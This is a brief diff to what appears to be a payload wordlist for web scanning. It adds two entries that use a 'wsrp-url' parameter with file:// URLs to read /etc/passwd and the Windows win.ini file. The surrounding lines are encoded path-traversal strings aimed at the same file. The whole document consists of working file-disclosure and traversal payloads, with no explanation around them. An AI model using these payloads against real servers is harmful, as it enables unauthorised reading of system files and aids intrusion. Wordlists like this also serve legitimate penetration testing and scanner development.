@@ -804,3 +804,5 @@
 /.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/windows/win.ini
 /../../../../../../../../../windows/win.ini
 /%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
+/RP?wsrp-url=file:///etc/passwd
+/RP?wsrp-url=file:///c:\\windows\\win.ini
